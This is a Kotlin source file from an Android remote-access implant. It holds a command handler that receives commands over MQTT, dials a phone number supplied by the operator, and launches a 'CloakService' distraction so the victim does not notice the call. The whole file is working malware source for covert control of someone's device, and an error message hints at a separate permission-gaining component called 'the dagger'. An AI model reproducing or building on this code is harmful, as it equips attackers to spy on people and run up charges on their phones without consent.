package com.cooperthecoder.implant.command.handlers

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.support.v4.content.ContextCompat
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.command.Command
import org.eclipse.paho.android.service.MqttAndroidClient


class CallHandler(context: Context, client: MqttAndroidClient, command: Command): CommandHandler(context, client, command) {
    companion object {
        const val PREFIX = "tel:"
    }
    override fun action() {
        var phoneNumber = command.arguments["phone_number"]
        if (phoneNumber == null) {
            reply("", "Arguments: phone_number")
            return
        }

        if (! phoneNumber.startsWith(PREFIX)) {
            phoneNumber = "${PREFIX}$phoneNumber"
        }

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            val phoneCallIntent = Intent(Intent.ACTION_CALL)
            phoneCallIntent.data = Uri.parse(phoneNumber)
            val distractionIntent = Intent(context, CloakService::class.java)
            distractionIntent.action = CloakService.ACTION_DISTRACTION
            context.startService(distractionIntent)
            reply("Dialing $phoneNumber", "")
            context.startActivity(phoneCallIntent)
        } else {
            reply("", "Phone permission has not been granted. Try using the dagger")
        }
    }

}